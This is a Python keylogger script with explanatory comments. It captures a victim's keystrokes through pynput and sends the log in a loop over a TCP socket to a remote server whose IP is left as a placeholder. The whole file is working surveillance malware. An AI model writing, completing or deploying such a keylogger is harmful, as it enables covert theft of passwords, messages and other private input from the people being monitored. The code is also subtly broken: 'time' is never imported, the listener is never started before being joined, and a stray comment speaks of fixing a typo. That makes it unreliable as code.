# Import socket for network communication
import socket

# Import pynput for capturing keyboard events
import pynput.keyboard

# Import threading to run log sending in parallel
import threading

class Keylogger:

    # Initialize with server IP and port where logs will be sent
    def __init__(self, server_ip, server_port):
        self.log = ""                     # Variable to store keystrokes
        self.server_ip = server_ip        # IP address of the server
        self.server_port = server_port    # Port number of the server

    # Append captured keystroke to the log
    def append_to_log(self, string):
        self.log += string 

    # Callback for each key press
    def on_press(self, key):
        try:
            # Attempt to log regular characters
            self.append_to_log(key.char)
        except AttributeError:
            # Handle special keys (like space, shift, etc.)
            if key == key.space: 
                self.append_to_log(" ")
            else:
                self.append_to_log(" " + str(key) + " ") 

    # Continuously send the log to the remote server
    def send_log(self):
        while True:
            if self.log:
                try:
                    # Create a TCP socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    # Connect to the server
                    s.connect((self.server_ip, self.server_port))
                    # Send the logged keystrokes
                    s.send(self.log.encode())
                    # Clear the log after sending
                    self.log = ""
                    s.close()
                except Exception as e:
                    print(f"Error sending log : {e}")
                    # Wait 10 seconds before retrying if error occurs
                    time.sleep(10)

    # Start the keylogger and the sending thread
    def start(self):
        # Start listening to keyboard events
        keyboard_listener = pynput.keyboard.Listener(on_press=self.on_press)
        if keyboard_listener:
            # ⚠️ Fixing typo: 'threat' ➝ 'thread' and variable name mismatch
            send_thread = threading.Thread(target=self.send_log)
            send_thread.start()
            keyboard_listener.join()

# Entry point: set IP and port and start the keylogger
if __name__ == "__main__":
    keylogger = Keylogger("server_ip", 1234)  # Replace "server_ip" with actual IP address
    keylogger.start()
